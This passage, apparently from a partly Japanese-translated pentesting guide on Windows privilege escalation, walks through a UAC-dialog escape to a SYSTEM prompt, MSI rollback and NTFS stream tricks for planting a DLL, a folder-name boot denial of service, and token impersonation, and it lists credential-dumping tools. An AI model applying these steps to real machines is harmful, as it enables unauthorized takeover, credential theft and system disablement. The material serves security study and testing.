To exploit this vulnerability, 以下の手順を実行する必要があります:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

The attack basically consist of abusing the Windows Installer's rollback feature to replace legitimate files with malicious ones during the uninstallation process. For this the attacker needs to create a **malicious MSI installer** that will be used to hijack the `C:\Config.Msi` folder, which will later be used by he Windows Installer to store rollback files during the uninstallation of other MSI packages where the rollback files would have been modified to contain the malicious payload.

The summarized technique is the following:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion** ?

You could exploit **NTFS internals**: every folder has a hidden alternate data stream called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
このストリームはフォルダの**インデックスメタデータ**を格納します。

したがって、フォルダの**`::$INDEX_ALLOCATION`ストリームを削除すると**、NTFSはファイルシステムからフォルダ全体を**削除します**。

これには次のような標準のファイル削除APIを使用できます:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *file* delete API を呼び出しているにもかかわらず、**フォルダ自体が削除されます**。

### Folder Contents Delete から SYSTEM EoP へ
もしあなたの primitive が任意のファイル/フォルダを削除できないが、攻撃者が制御するフォルダの *contents* の**削除を許可している**としたらどうしますか？

1. Step 1: おとりのフォルダとファイルをセットアップ
- 作成: `C:\temp\folder1`
- その中に: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を配置
- oplock は、特権プロセスが `file1.txt` を削除しようとするときに**実行を一時停止します**。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. ステップ 3: SYSTEM プロセスをトリガーする（例：`SilentCleanup`）
- このプロセスはフォルダ（例：`%TEMP%`）をスキャンし、その内容を削除しようとします。
- `file1.txt` に到達すると、**oplock がトリガーされ**、コールバックに制御が渡されます。

4. ステップ 4: oplock コールバック内 – 削除をリダイレクトする

- オプション A: `file1.txt` を別の場所に移動する
- これは `folder1` を oplock を壊さずに空にします。
- 直接 `file1.txt` を削除しないでください — それは oplock を早期に解放してしまいます。

- オプション B: `folder1` を **junction** に変換する:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- オプション C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> これはフォルダのメタデータを格納する NTFS の内部ストリームを対象としています — これを削除するとフォルダ自体が削除されます。

5. Step 5: Release the oplock
- SYSTEM プロセスが継続して `file1.txt` を削除しようとします。
- しかし今は junction + symlink のため、実際には次を削除しています:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` は SYSTEM によって削除される。

### Arbitrary Folder Create から Permanent DoS へ

そのようなプリミティブを悪用すると、たとえ **you can’t write files** や **set weak permissions** でも、**create an arbitrary folder as SYSTEM/admin** が可能になる。

例として、**critical Windows driver** の名前で**folder**（ファイルではなく）を作成する。例:
```
C:\Windows\System32\cng.sys
```
- このパスは通常 `cng.sys` のカーネルモードドライバに対応します。
- もし **事前にフォルダとして作成しておくと**、Windowsは起動時に実際のドライバを読み込めません。
- その後、Windowsは起動中に `cng.sys` を読み込もうとします。
- フォルダを検出すると、**実際のドライバを解決できず**、**クラッシュまたは起動停止**します。
- **代替手段はなく**、外部介入（例：ブート修復やディスクアクセス）なしでは**回復できません**。


## **High Integrity から System へ**

### **新しいサービス**

既に High Integrity プロセスで実行している場合、**SYSTEM へのパス**は**新しいサービスを作成して実行するだけで**簡単に得られることがあります：
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> サービス用のバイナリを作成する際は、それが有効な service であるか、あるいは無効な service の場合でも必要な処理を速やかに行うことを確認してください。無効な service の場合は 20s で終了されます。

### AlwaysInstallElevated

High Integrity プロセスから AlwaysInstallElevated レジストリ項目を有効にし、_**.msi**_ ラッパーを使って reverse shell をインストールすることができます。\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**確認できます** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

これらの token 権限を持っている場合（おそらく既に High Integrity プロセス内で見つかるでしょう）、SeDebug 権限でほとんどのプロセス（保護されたプロセスを除く）を開き、そのプロセスの token をコピーして、その token で任意のプロセスを作成できます。\
この手法では通常、token 権限をすべて持つ SYSTEM として動作しているプロセスを選択します（はい、すべての token 権限を持っていない SYSTEM プロセスも存在します）。\
**例となるコードは** [**こちら**](sedebug-+-seimpersonate-copy-token.md)**で確認できます。**

### **Named Pipes**

この手法は meterpreter が `getsystem` を行う際に使用します。手法は「pipe を作成し、service を作成／悪用してその pipe に書き込ませる」ことです。すると、その pipe を作成した server は `SeImpersonate` 権限を使って pipe クライアント（service）の token を impersonate でき、SYSTEM 権限を得られます。\
名前付きパイプについて詳しく学びたい場合は [**learn more about name pipes you should read this**](#named-pipe-client-impersonation) を読んでください。\
High Integrity から System へ名前付きパイプを使って昇格する例を読みたい場合は [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md) を参照してください。

### Dll Hijacking

もし SYSTEM として動作するプロセスによって読み込まれる dll をハイジャックできれば、その権限で arbitrary code を実行できます。したがって Dll Hijacking はこの種の権限昇格にも有用であり、さらに High Integrity プロセスから達成する方がはるかに容易です（dll を読み込むフォルダに対する書き込み権限を持っているため）。\
**詳細は** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**を参照してください。**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**参照:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows のローカル権限昇格ベクターを探す最良のツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 誤設定や機密ファイルをチェック（**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。検出済み。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- いくつかの誤設定をチェックして情報を収集します（**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 誤設定をチェック**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla, および RDP の保存セッション情報を抽出します。ローカルで使用する場合は -Thorough を使ってください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager から認証情報を抽出します。検出済み。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集したパスワードをドメイン全体にスプレーします。**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh は PowerShell ベースの ADIDNS/LLMNR/mDNS/NBNS スプーファー兼 man-in-the-middle ツールです。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的な Windows の権限昇格列挙ツール**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- 既知の権限昇格脆弱性を検索（Watson に置換され非推奨）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカルチェック **(管理者権限が必要)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の権限昇格脆弱性を検索します（VisualStudio でコンパイルする必要があります） ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- ホストを列挙して誤設定を探します（privesc より情報収集向け）（コンパイルが必要） **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多数のソフトウェアから認証情報を抽出します（GitHub に precompiled exe）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp を C# に移植したもの**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- 誤設定をチェック（実行可能ファイルは GitHub にプリコンパイル済み）。推奨しません。Win10 ではあまり動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 可能な誤設定をチェックします（python からの exe）。推奨しません。Win10 ではあまり動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この投稿を元に作成されたツール（正しく動作するために accesschk は不要ですが、利用可能です）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** の出力を読み、動作する exploit を推奨します（ローカル、python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** の出力を読み、動作する exploit を推奨します（ローカル、python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

このプロジェクトは正しいバージョンの .NET を使ってコンパイルする必要があります（[see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。ターゲットホストにインストールされている .NET のバージョンを確認するには次のようにしてください：
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考資料

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
